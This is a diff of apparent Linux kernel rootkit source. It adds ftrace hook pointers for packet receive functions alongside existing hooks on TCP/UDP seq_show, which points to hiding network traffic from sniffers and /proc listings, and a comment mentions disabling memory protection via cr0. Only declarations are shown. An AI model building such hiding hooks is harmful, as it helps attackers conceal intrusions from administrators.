@@ -8,6 +8,7 @@
 #include <linux/linkage.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
+#include <linux/netdevice.h> // sk_buff, packet_type
 /*
 Note: hooking is achievable also with kprobe, for now ftrace is the choice for being common 
 If your kernel is built with CONFIG_OPTPROBES=y (currently this flag is automatically set 'y' on x86/x86-64,
@@ -18,7 +19,7 @@ So, even if it's not possible to optimize this particular probepoint, there'll b
 Hooking is also achievable with changing the cr0 register to disable memory protection make the memory writable
 */
 
-const int ACTIVE_HOOKS_SIZE = 10; /*Available number of hooks to store*/
+const int ACTIVE_HOOKS_SIZE = 13; /*Available number of hooks to store*/
 
 #ifdef PTREGS_SYSCALL_STUB
 typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); /*define type for syscalls functions, can be long even for int ret*/
@@ -40,12 +41,15 @@ static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage int (*orig_packet_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+static asmlinkage int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+static asmlinkage int (*orig_packet_rcv_spkt)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
 
 
 #define HOOK(_name, _hook, _orig)\
 {					             \
 	.name = _name,		         \
-	.function = (_hook),		     \
+	.function = (_hook),		 \
 	.original = (_orig),		 \
 }
 
